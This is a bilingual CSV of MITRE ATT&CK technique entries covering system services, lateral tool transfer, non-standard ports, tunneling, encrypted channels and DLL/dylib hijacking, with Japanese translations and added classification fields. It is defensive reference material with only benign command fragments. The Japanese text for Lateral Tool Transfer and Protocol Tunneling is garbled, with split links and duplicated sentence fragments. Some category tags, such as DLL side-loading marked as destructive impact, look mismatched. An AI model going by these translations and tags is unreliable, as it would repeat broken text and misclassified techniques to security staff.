T1569,,System Services,システムサービス,"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.",攻撃者はシステムサービスやデーモンを悪用し、コマンドやプログラムを実行する可能性があります。攻撃者はローカルまたはリモートでサービスとやり取りしたり作成したりすることで、悪意のあるコンテンツを実行できます。多くのサービスは起動時に実行されるように設定されており、これは持続性の達成に役立ちます（[システムプロセスの作成または変更](https://attack.mitre.org/techniques/T1543)）。しかし攻撃者は、単発または一時的な実行のためにサービスを利用することも可能です。,execution,Windows;macOS;Linux,script_command_execution,foothold,endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253,2020-03-10T18:23:06.482Z,2025-04-15T19:59:10.127Z,,,,
T1569.001,T1569,Launchctl,Launchctl,"Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man) Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w ""%s/Library/LaunchAgents/%s""</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)","攻撃者はlaunchctlを悪用してコマンドやプログラムを実行する可能性がある。launchctlはmacOSのサービス管理フレームワークであるlaunchdと連携する。launchctlはコマンドライン上でのサブコマンド実行、対話的操作、さらには標準入力からのリダイレクトにも対応している。(引用元: Launchctl Man) 攻撃者はlaunchctlを使用して、コマンドやプログラムを[Launch Agent](https://attack.mitre.org/techniques/T1543/001)や[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)として実行します。 一般的なサブコマンドには、<code>launchctl load</code>、<code>launchctl unload</code>、<code>launchctl start</code> などがあります。攻撃者は、スクリプトを使用するか、手動で <code>launchctl load -w ""%s/Library/LaunchAgents/%s""</code> または <code>/bin/launchctl load</code> を実行して、[Launch Agent](https://attack.mitre.org/techniques/T1543/001) や [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) を実行できます。(引用元: Sofacy Komplex Trojan)(引用元: 20 macOS Common Tools and Techniques)",execution,macOS,script_command_execution,foothold,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--810aa4ad-61c9-49cb-993f-daa06199421d,2020-03-10T18:26:56.187Z,2025-04-15T19:58:46.562Z,,,,
T1569.002,T1569,Service Execution,サービス実行,Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039). [PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution. Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.,攻撃者は、悪意のあるコマンドやペイロードを実行するために Windows サービス制御マネージャを悪用する可能性があります。 Windows サービス制御マネージャー (<code>services.exe</code>) は、サービスを管理および操作するためのインターフェイスです。(引用: Microsoft サービス制御マネージャー) サービス制御マネージャーは、GUI コンポーネントや、<code>sc.exe</code> や [Net](https://attack.mitre.org/software/S0039) などのシステムユーティリティを介してユーザーがアクセスできます。 [PsExec](https://attack.mitre.org/software/S0029)も、サービス制御マネージャーAPIを通じて作成された一時的なWindowsサービス経由でコマンドやペイロードを実行するために使用できます。（引用元：Russinovich Sysinternals）[PsExec](https://attack.mitre.org/software/S0029) や <code>sc.exe</code> などのツールは、引数としてリモートサーバーを受け入れることができ、リモート実行を行うために使用される可能性があります。 攻撃者はこれらのメカニズムを悪用して悪意のあるコンテンツを実行する可能性があります。これは新規または改変されたサービスの実行によって実現されます。この手法は、サービスの永続化や権限昇格時に[Windows Service](https://attack.mitre.org/techniques/T1543/003)と組み合わせて使用される実行手法です。,execution,Windows,script_command_execution,foothold,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4,2020-03-10T18:33:36.159Z,2025-04-15T19:59:20.444Z,,,,
T1569.003,T1569,Systemctl,systemctl,"Adversaries may abuse systemctl to execute commands or programs. Systemctl is the primary interface for systemd, the Linux init system and service manager. Typically invoked from a shell, Systemctl can also be integrated into scripts or applications. Adversaries may use systemctl to execute commands or programs as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s. Common subcommands include: `systemctl start`, `systemctl stop`, `systemctl enable`, `systemctl disable`, and `systemctl status`.(Citation: Red Hat Systemctl 2022)",攻撃者はsystemctlを悪用してコマンドやプログラムを実行する可能性があります。systemctlはLinuxのinitシステムおよびサービスマネージャーであるsystemdの主要なインターフェースです。通常シェルから呼び出されますが、スクリプトやアプリケーションに統合することも可能です。 攻撃者はsystemctlを使用して、[Systemdサービス](https://attack.mitre.org/techniques/T1543/002)としてコマンドやプログラムを実行する可能性があります。一般的なサブコマンドには、`systemctl start`、`systemctl stop`、`systemctl enable`、`systemctl disable`、`systemctl status`などがあります。(引用元: Red Hat Systemctl 2022),execution,Linux,script_command_execution,foothold,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--4b46767d-4a61-4f30-995e-c19a75c2e536,2025-03-18T13:44:12.618Z,2025-04-15T19:58:28.694Z,,,,
T1570,,Lateral Tool Transfer,横方向ツール転送,"Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019) Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.(Citation: Dropbox Malware Sync)",攻撃者は侵害された環境内でシステム間ツールやその他のファイルを転送する場合があります。被害者環境へ導入された後（すなわち[侵入ツール転送](https://attack.mitre.org/techniques/T1105)）、ファイルはシステム間でコピーされ、攻撃ツールやその他のファイルを作戦中に展開するために使用される可能性があります。 攻撃者は、内部被害システム間でファイルをコピーし、横方向移動を支援することがあります。これには、接続されたネットワーク共有への[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)を介したファイル共有や、[リモートデスクトッププロトコル](https://attack)による認証済み接続など、固有のファイル共有プロトコルが使用されます。mitre.org/techniques/T1021/001) による認証済み接続など、固有のファイル共有プロトコル（例：[SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) 経由のファイル共有）を利用して、被害者システム間でファイルをコピーし、横方向移動を支援することがあります。(引用元: Unit42 LockerGoga 2019) また、被害者システムにネイティブで存在する、あるいはその他の方法で利用可能なツール（例：scp、rsync、curl、sftp、[ftp](https://attack.mitre.org/software/S0095)）を使用してファイルを転送することも可能です。 場合によっては、攻撃者はDropboxやOneDriveなどの[Webサービス](https://attack.mitre.org/techniques/T1102)を活用し、共有され自動同期されるフォルダを介してマシン間でファイルをコピーできる可能性がある。(引用: Dropbox Malware Sync),lateral-movement,Linux;macOS;Windows;ESXi,remote_service_abuse,boundary_crossing,network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5,2020-03-11T21:01:00.959Z,2025-04-15T19:59:03.832Z,,,,
T1571,,Non-Standard Port,非標準ポート,"Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data. Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)",攻撃者は、通常関連付けられていないプロトコルとポートの組み合わせを使用して通信する場合があります。例えば、従来のポート443ではなく、ポート8088(出典: Symantec Elfin 2019年3月)やポート587(出典: Fortinet Agent Tesla 2018年4月)を使用したHTTPSなどです。 攻撃者は、フィルタリングを回避したりネットワークデータの解析を混乱させたりするため、プロトコルが使用する標準ポートを変更することがあります。また、被害者システムを変更して非標準ポートを悪用することもあります。例えば、レジストリキーやその他の設定を使用してプロトコルとポートの組み合わせを変更できます。（引用元: change_rdp_port_conti）,command-and-control,Linux;macOS;Windows;ESXi,remote_service_abuse,remote_control,authentication_system;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18,2020-03-14T18:18:32.443Z,2025-04-15T19:58:58.463Z,,,,
T1572,,Protocol Tunneling,プロトコルトンネリング,"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling)(Citation: Sygnia Abyss Locker 2025) [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) Adversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure.",攻撃者は、検出/ネットワークフィルタリングを回避し、または通常は到達不可能なシステムへのアクセスを可能にするため、別プロトコル内で被害システムとのネットワーク通信をトンネリングする場合がある。トンネリングは、あるプロトコルを別のプロトコル内に明示的にカプセル化する行為である。この手法は、既存のトラフィックに紛れ込むことで悪意のあるトラフィックを隠蔽したり、VPNと同様の外層暗号化を提供したりする可能性がある。 また、SMBやRDPなど、ネットワーク機器でフィルタリングされたりインターネット経由でルーティングされないトラフィックなど、本来到達しないネットワークパケットのルーティングを可能にする場合もある。プロトコルを別のプロトコル内にカプセル化する手段は様々である。例えば、攻撃者はSSHトンネリング（SSHポートフォワーディングとも呼ばれる）を実行し、暗号化されたSSHトンネル経由で任意のデータを転送することがある。(引用: SSH Tunneling)(引用: Sygnia Abyss Locker 2025) [プロトコルトンネリング](https://attack.mitre.org/techniques/T1572)は、[動的解決](https://attack.mitre.org/techniques/T1568)中に攻撃者によって悪用される可能性もある。 DNS over HTTPS (DoH) として知られる、C2 インフラストラクチャを解決するためのクエリは、暗号化された HTTPS パケット内にカプセル化される場合があります。(引用: BleepingComp Godlua JUL19) 敵対者は、[プロキシ](https://attack.mitre.org/techniques/T1090) および/または [プロトコルまたはサービスのなりすまし](https://attack.mitre.org/techniques/T1001/003) と組み合わせて、[プロトコルトンネリング](https://attack.mitre.org/techniques/T1572) を活用して、さらに攻撃を進める場合もあります。mitre.org/techniques/T1090) および/または [プロトコルまたはサービスのなりすまし](https://attack.mitre.org/techniques/T1001/003) を組み合わせて、C2通信とインフラをさらに隠蔽する可能性がある。,command-and-control,Linux;macOS;Windows;ESXi,remote_service_abuse,remote_control,network_connectivity,specified,Business Workstation;File Server;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b,2020-03-15T16:03:39.082Z,2025-04-15T19:58:29.875Z,,,,
T1573,,Encrypted Channel,暗号化チャネル,"Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",攻撃者は、通信プロトコルが提供する固有の保護機能に依存するのではなく、暗号化アルゴリズムを使用してコマンド＆コントロールトラフィックを隠蔽する場合があります。安全なアルゴリズムを使用しているにもかかわらず、秘密鍵がマルウェアサンプル/設定ファイル内でエンコードおよび/または生成されている場合、これらの実装はリバースエンジニアリングに対して脆弱である可能性があります。,command-and-control,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,remote_control,endpoint_execution;file_storage_access,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118,2020-03-16T15:33:01.739Z,2025-04-15T19:59:01.172Z,,,,
T1573.001,T1573,Symmetric Cryptography,対称暗号,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",攻撃者は、通信プロトコルが提供する固有の保護機能に依存せず、既知の対称暗号化アルゴリズムを使用してコマンドアンドコントロール通信を隠蔽する可能性がある。対称暗号化アルゴリズムは、平文の暗号化と暗号文の復号化に同じ鍵を使用する。一般的な対称暗号化アルゴリズムには、AES、DES、3DES、Blowfish、RC4などがある。,command-and-control,Linux;Windows;macOS;Network Devices;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41,2020-03-16T15:45:17.032Z,2025-04-15T19:58:14.636Z,,,,
T1573.002,T1573,Asymmetric Cryptography,非対称暗号,"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal. For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",攻撃者は、通信プロトコルが提供する固有の保護機能に依存する代わりに、既知の非対称暗号化アルゴリズムを用いてコマンド・アンド・コントロール通信を隠蔽する可能性がある。 非対称暗号（公開鍵暗号とも呼ばれる）は、各当事者に鍵ペアを使用する：自由に配布可能な公開鍵と、秘密鍵である。鍵の生成方法により、送信者は受信者の公開鍵でデータを暗号化し、受信者は自身の秘密鍵でデータを復号する。これにより、意図した受信者だけが暗号化されたデータを読み取れることが保証される。 一般的な公開鍵暗号アルゴリズムにはRSAやElGamalがある。効率化のため、多くのプロトコル（SSL/TLSを含む）は接続確立後は対称暗号を使用するが、鍵の確立や伝送には非対称暗号を用いる。このため、これらのプロトコルは[非対称暗号](https://attack.mitre.org/techniques/T1573/002)に分類される。,command-and-control,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada,2020-03-16T15:48:33.882Z,2025-04-15T19:59:03.664Z,,,,
T1574,,Hijack Execution Flow,実行フローの乗っ取り,"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution. There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、自身の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、永続化を目的とする場合があります。これは、ハイジャックされた実行が時間経過とともに再発する可能性があるためです。攻撃者はまた、特権昇格や防御回避（アプリケーション制御やその他の実行制限など）のためにこれらのメカニズムを利用する場合もあります。 攻撃者が実行フローをハイジャックする方法は多岐にわたり、OSが実行対象プログラムを検索する方法を操作することも含まれる。プログラムが使用するライブラリをOSが検索するプロセスも傍受可能である。OSがプログラム/リソースを検索する場所（ファイルディレクトリやWindowsの場合のレジストリなど）を改ざんし、悪意のあるペイロードを含めることも可能である。,persistence;privilege-escalation;defense-evasion,Linux;macOS;Windows,config_policy_manipulation,privilege_gain,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6,2020-03-12T20:38:12.465Z,2025-04-15T19:58:57.767Z,,,,
T1574.001,T1574,DLL,DLL,"Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42) Specific ways DLLs are abused by adversaries include: ### DLL Sideloading Adversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s). Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process. Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl) ### DLL Search Order Hijacking Adversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42) ### DLL Redirection Adversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly) ### Phantom DLL Hijacking Adversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike) ### DLL Substitution Adversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking) Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses. Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading) If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",攻撃者は、永続化、権限昇格、防御回避を目的としてダイナミックリンクライブラリファイル（DLL）を悪用する可能性があります。DLLは、複数のプログラムが同時に利用できるコードとデータを含むライブラリです。DLL自体は本質的に悪意のあるものではありませんが、サイドローディング、検索順序の乗っ取り、ファントムDLL乗っ取りなどのメカニズムを通じて悪用される可能性があります。(引用元: unit 42) 攻撃者によるDLL悪用の具体的な手法には以下が含まれる:### DLLサイドローディング攻撃者はDLLをサイドローディングすることで独自の悪意あるペイロードを実行する。サイドローディングとは、正当なアプリケーションを仕込み実行させることで、プログラムがロードするDLLを乗っ取る手法である。これにより被害者アプリケーションと悪意あるペイロードが並列配置される。 攻撃者は、正当で信頼され、場合によっては特権化されたシステムやソフトウェアプロセス下で実行する動作を隠蔽する手段としてサイドローディングを利用する可能性が高い。ペイロードのサイドローディングに使用される無害な実行ファイルは、配信時および/または実行時に検知されない場合がある。攻撃者のペイロードは、信頼されたプロセスのメモリにロードされるまで暗号化/圧縮されるか、その他の方法で難読化されることもある。 攻撃者はBPL（Borland Package Library）などの他のパッケージをサイドローディングする場合もある。(引用元: kroll bpl)### DLL検索順序の乗っ取り攻撃者は、WindowsがDLLをロードする際に使用する検索順序を乗っ取ることで、自身の悪意あるペイロードを実行する可能性があります。この検索順序とは、プログラムがDLLをロードする際にチェックする、特別な検索場所と標準的な検索場所の順序です。攻撃者は、正当なライブラリの場所よりもDLL検索順序で優先されるディレクトリにトロイの木馬DLLを仕込むことができます。 これにより、被害者プログラムがDLLを呼び出した際にWindowsが不正なDLLをロードする。(引用元: unit 42) ### DLLリダイレクト 攻撃者はDLLリダイレクトにより検索順序を直接変更できる。これは(レジストリまたはリダイレクトファイルの作成により)有効化されると、プログラムが異なる場所からDLLをロードする原因となる。(引用元: Microsoft redirection)(引用元: Microsoft - manifests/assembly)### ファントム DLL ハイジャック 攻撃者は、存在しない DLL ファイルへの参照を標的にすることで、ファントム DLL ハイジャックを利用する場合があります。 攻撃者は、欠落したモジュールの場所に正しい名前で自身の悪意のある DLL を配置することで、それをロードできる可能性があります。(引用: Hexacorn DLL ハイジャック)(引用: Hijack DLLs CrowdStrike) ### DLL 置換 攻撃者は、既存の有効な DLL ファイルを標的にし、それらを自身の悪意のある DLL と置き換える可能性があります。(引用: Wietze Beukema DLLハイジャック) DLLハイジャックの被害を受けたプログラムは、正常に動作しているように見える場合があります。これは、悪意のあるDLLが、置き換えるべき正当なDLLもロードするように設定されている場合があり、防御を回避するためです。 プログラムが DLL をロードする前に、現在のディレクトリを Web 共有などのリモート場所に設定すると、リモート DLL ハイジャックが発生する可能性があります。(引用: dll pre load owasp)(引用: microsoft remote preloading) 正常な DLL がより高い特権レベルで実行されるように設定されている場合、ロードされる攻撃者制御の DLL もより高いレベルで実行されます。 この場合、本手法は権限昇格に悪用される可能性がある。,persistence;privilege-escalation;defense-evasion,Windows,config_policy_manipulation,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34,2020-03-13T18:11:08.357Z,2025-04-16T18:24:47.533Z,,,,
T1574.002,T1574,DLL Side-Loading,DLL サイドローディング,"Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s). Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",攻撃者は、DLL のサイドローディングによって独自の悪意のあるペイロードを実行する可能性があります。[DLL](https://attack.mitre.org/techniques/T1574/001) と同様に、サイドローディングは、プログラムがロードする DLL をハイジャックすることを含みます。 ただし、単にプログラムの検索順序内にDLLを配置して被害者アプリケーションが起動されるのを待つのではなく、攻撃者は正当なアプリケーションを配置し、そのアプリケーションを起動して自身のペイロードを実行させることで、ペイロードを直接サイドロードすることがあります。サイドローディングは、被害者アプリケーションと悪意のあるペイロードを並列に配置することで、ローダーが使用するDLL検索順序を利用します。 攻撃者は、正当で信頼され、場合によっては特権化されたシステムやソフトウェアプロセス下で実行する動作を隠蔽する手段としてサイドローディングを利用する可能性が高い。ペイロードのサイドローディングに使用される無害な実行ファイルは、配信時および/または実行時に検知されない場合がある。攻撃者のペイロードは、信頼されたプロセスのメモリにロードされるまで暗号化/圧縮されるか、その他の方法で難読化されることもある。（引用元: FireEye DLL Side-Loading）,persistence;privilege-escalation;defense-evasion,Windows,destructive_impact,privilege_gain,privileged_account;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b,2020-03-13T19:41:37.908Z,2025-04-15T19:59:17.126Z,,,,
T1574.004,T1574,Dylib Hijacking,Dylibハイジャック,"Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable. Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added. Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",攻撃者は、被害者アプリケーションが実行時に検索するパスに、予想される名前の悪意のある動的ライブラリ（dylib）を配置することで、自身のペイロードを実行する可能性がある。動的ローダーは、検索パスの順序に基づいてdylibを探索する。 dylibへのパスには<code>@rpath</code>を接頭辞として付与できる。これにより開発者は相対パスを使用し、実行ファイルの場所に基づいて実行時に使用される検索パスの配列を指定できる。さらに、<code>LC_LOAD_WEAK_DYLIB</code>関数などの弱リンクが使用されている場合、期待されるdylibが存在しなくてもアプリケーションは実行される。 弱リンクにより、開発者は新APIが追加される複数のmacOSバージョンでアプリケーションを実行できます。攻撃者は、特定されたパスに欠落したdylibと同じ名前の悪意あるdylibを挿入することで実行権を獲得する可能性があります。(引用: Wardle Dylib Hijack Vulnerable Apps)(引用: Wardle Dylib Hijacking OSX 2015)(引用: Github EmpireProject HijackScanner)(引用: Github EmpireProject CreateHijacker Dylib) Dylibはアプリケーションのアドレス空間にロードされるため、悪意のあるdylibはアプリケーションの権限レベルとリソースを継承します。 アプリケーションによっては、特権昇格や制限のないネットワークアクセスにつながる可能性があります。また、この手法は正当なプロセスに実行を隠蔽するため、セキュリティ製品による検出を回避する可能性があります。(引用: Writing Bad Malware for OSX)(引用: wardle artofmalware volume1)(引用: MalwareUnicorn macOS Dylib Injection MachO),persistence;privilege-escalation;defense-evasion,macOS,discovery_enumeration,privilege_gain,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004;TA0005,attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490,2020-03-16T15:23:30.896Z,2025-04-15T19:59:24.300Z,,,,
